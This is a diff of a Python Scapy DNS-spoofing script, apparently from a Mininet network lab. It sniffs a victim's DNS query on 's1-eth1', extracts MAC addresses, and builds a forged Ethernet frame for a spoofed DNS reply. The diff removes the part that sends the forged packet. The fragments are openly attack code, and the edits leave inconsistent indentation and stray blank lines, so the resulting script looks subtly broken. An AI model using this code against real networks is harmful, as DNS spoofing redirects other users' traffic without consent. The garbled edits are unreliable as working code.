@@ -30,7 +30,17 @@ def main():
   print(' Sniffing for DNS Packet ')
   s1iface = "s1-eth1"
   DNSPacket = sniff(iface=s1iface, filter="dst port 53", count=1)
-        
+  
+  #h1's MAC address   
+  clientHwAddr = DNSPacket[0].getlayer(Ether).src
+
+    #h3's MAC address
+  spoofedHwAddr = DNSPacket[0].getlayer(Ether).dst
+
+  spoofedEtherPkt = Ether(src=spoofedHwAddr,dst=clientHwAddr)
+  
+  
+  
   # if the sniffed packet is a DNS Query, let's do some work
   if ( DNSPacket[0].haslayer(DNS) ) and  ( DNSPacket[0].getlayer(DNS).qr == 0 ) and (DNSPacket[0].getlayer(DNS).qd.qtype == 1) and ( DNSPacket[0].getlayer(DNS).qd.qclass== 1 ):
    print('\n Got Query on %s ' %ctime())
@@ -47,11 +57,7 @@ def main():
     pass
     # I'm not tryint to figure out what you are ... moving on
    
-   clientHwAddr = 
-
-   spoofedHwAddr = 
-
-   spoofedEtherPkt = Ether(src=spoofedHwAddr,dst=clientHwAddr)
+   
 
 
    # Extract DNS Query ID. The Query ID is extremely important, as the response's Query ID must match the request Query ID
@@ -110,16 +116,6 @@ def main():
 
 
 if __name__ == '__main__':
- main()
+   main()
    
-   # Now that we have built our packet, let's go ahead and send it on its merry way.
-   print(' \n Sending spoofed response packet ')
-   sendp(spoofedEtherPkt/spoofedIPPkt/spoofedUDP_TCPPacket/spoofedDNSPakcet,iface=s1iface, count=1)
-   print(' Spoofed DNS Server: %s \n src port:%d dest port:%d ' %(spoofedDNSServerIP, 53, clientSrcPort ))
-
-  else:
-   pass
-
-
-if __name__ == '__main__':
- main()
+  
